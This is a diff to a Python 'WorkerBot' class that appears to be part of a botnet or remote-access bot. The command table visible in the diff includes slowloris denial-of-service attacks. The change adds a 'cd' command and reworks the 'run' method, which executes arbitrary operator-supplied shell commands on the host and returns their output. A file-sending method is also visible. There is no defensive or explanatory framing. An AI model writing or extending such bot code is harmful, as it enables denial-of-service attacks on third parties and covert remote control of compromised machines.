@@ -221,8 +221,12 @@ class WorkerBot(BaseWorkerBot):
             ('slowloris (?P<host>[^\s]+) (?P<num>\d+) (?P<timeout>\d+)(?: (?P<port>\d+))?', self.slowloris),
             ('slowloristest (?P<host>[^\s]+)(?: (?P<port>\d+))?', self.slowloristest),
             ('status', self.status_report),
+            ('cd (?P<directory>.*)', self.cd),
         )
-    
+
+    def cd(self, directory):
+        os.chdir(directory)
+
     def get_time(self, format=None):
         now = datetime.datetime.now() # remember to import datetime at the top of the module
         if format:
@@ -274,7 +278,7 @@ class WorkerBot(BaseWorkerBot):
         return str(open_ports)
     
     def run(self, program):
-        if program != "show": 
+        if program != "show":
             self.task_process = subprocess.Popen(shlex.split(program),
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
@@ -284,22 +288,16 @@ class WorkerBot(BaseWorkerBot):
         elif self.task_process is None:
             return ""
 
+        lines = []
         try:
-            self.task_process.wait(timeout=10)
-        except subprocess.TimeoutExpired:
-            lines = []
-            signal.signal(signal.SIGALRM, lambda: 0/0)
-            signal.alarm(5) # time out in seconds
-            try:
+            with gevent.Timeout(6):
                 for line in iter(self.task_process.stdout.readline, b''):
+                    if not line:
+                        break
                     lines.append(line.rstrip())
-                signal.alarm(0)
-            except Exception:
-                pass
-
-            return "\n".join(lines[:10])
-        else:
-            return "\n".join(self.task_process.stdout.read().splitlines()[:10])
+        except gevent.Timeout:
+            pass
+        return "\n".join([*lines[:4], *["..."], *lines[-4:]] if len(lines) > 8 else lines)
     
     def send_file(self, filename, destination):
         try:
